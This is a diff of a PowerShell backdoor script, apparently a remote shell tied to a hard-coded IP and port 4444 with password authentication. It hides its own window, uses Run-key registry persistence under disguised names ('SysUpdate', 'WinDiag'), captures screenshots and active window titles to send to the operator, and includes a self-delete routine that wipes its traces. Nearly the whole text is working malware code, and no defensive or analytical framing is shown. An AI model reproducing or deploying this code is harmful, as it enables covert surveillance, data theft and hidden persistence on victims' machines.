@@ -1,5 +1,8 @@
-$ip = '172.16.176.40'; $port = 4444; $pass = "biskviti" 
-$reg = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; $name = "SysUpdate"
+$ip = '172.16.176.40'; $port = 4444; $pass = "Pico2026" 
+$regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
+
+$regNames = @("SysUpdate", "WinDiag") 
+$scriptPath = "$env:TEMP\sysupd.ps1"
 
 $api = Add-Type -Name Win32 -MemberDefinition @'
 [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
@@ -8,9 +11,15 @@ $api = Add-Type -Name Win32 -MemberDefinition @'
 '@ -PassThru
 $api::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
 
-function Die {
-    Remove-ItemProperty -Path $reg -Name $name -Force -ErrorAction SilentlyContinue
-    Stop-Process -Id $PID -Force
+function Master-Kill {
+    foreach ($name in $regNames) {
+        Remove-ItemProperty -Path $regPath -Name $name -Force -ErrorAction SilentlyContinue
+    }
+    
+    $cmd = "/c taskkill /F /PID $PID & del /f /q `"$scriptPath`" & exit"
+    Start-Process cmd.exe -ArgumentList $cmd -WindowStyle Hidden
+    
+    exit
 }
 
 while($true) {
@@ -20,26 +29,28 @@ while($true) {
         $s.Write(($e.GetBytes("AUTH REQUIRED: ")), 0, 15)
         [byte[]]$authB = New-Object byte[] 64; $len = $s.Read($authB, 0, $authB.Length)
         if ($len -le 0) { $c.Close(); continue }
-        $attempt = $e.GetString($authB, 0, $len).Trim()
-
-        if ($attempt -ne $pass) {
-            $s.Write(($e.GetBytes("ACCESS DENIED. SELF-DESTRUCTING...`n")), 0, 36)
-            $c.Close(); Die
+        
+        if ($e.GetString($authB, 0, $len).Trim() -ne $pass) { 
+            $s.Write(($e.GetBytes("FAIL. TERMINATING.`n")), 0, 19)
+            $c.Close(); Master-Kill 
         }
 
-        $s.Write(($e.GetBytes("ACCESS GRANTED.`nCommands: 'screen' (Active Window), 'screenshot' (Base64), 'kill'`nPS $PWD> ")), 0, 92)
+        $s.Write(($e.GetBytes("ACCESS GRANTED.`nCommands: 'screen', 'screenshot', 'kill'`nPS $PWD> ")), 0, 75)
 
         [byte[]]$b = New-Object byte[] 65535
         while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
             $in = $e.GetString($b, 0, $i).Trim(); $out = ""
 
-            if ($in -eq 'kill') { Die }
+            if ($in -eq 'kill') { 
+                $s.Write(($e.GetBytes("Wiping traces and stopping subprocesses...`n")), 0, 43)
+                $c.Close(); Master-Kill 
+            }
             
             elseif ($in -eq 'screen') {
                 $handle = $api::GetForegroundWindow()
                 $sb = New-Object System.Text.StringBuilder 256
                 $api::GetWindowText($handle, $sb, $sb.Capacity)
-                $out = "[!] Current Window: " + $sb.ToString() + "`n"
+                $out = "[!] Active Window: " + $sb.ToString() + "`n"
             }
 
             elseif ($in -eq 'screenshot') {
@@ -49,16 +60,9 @@ while($true) {
                     $bmp = New-Object System.Drawing.Bitmap $sc.Width, $sc.Height
                     $g = [System.Drawing.Graphics]::FromImage($bmp)
                     $g.CopyFromScreen($sc.X, $sc.Y, 0, 0, $bmp.Size)
-                    
                     $ms = New-Object System.IO.MemoryStream
-                    $encoder = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
-                    $prms = New-Object System.Drawing.Imaging.EncoderParameters(1)
-                    $prms.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, 60)
-                    $bmp.Save($ms, $encoder, $prms)
-                    
-                    $base64 = [Convert]::ToBase64String($ms.ToArray())
-                    $out = "`n---BEGIN SCREENSHOT---`n$base64`n---END---`n"
-                    
+                    $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+                    $out = "`n---BEGIN---`n" + [Convert]::ToBase64String($ms.ToArray()) + "`n---END---`n"
                     $g.Dispose(); $bmp.Dispose(); $ms.Dispose()
                 } catch { $out = "[!] Screenshot Error: $($_.Exception.Message)`n" }
             }
@@ -68,5 +72,7 @@ while($true) {
             
             $resp = $e.GetBytes($out + "PS $PWD> "); $s.Write($resp, 0, $resp.Length); $s.Flush()
         }
-    } catch { Start-Sleep 5 }
+    } catch { 
+        Start-Sleep 10 
+    }
 }
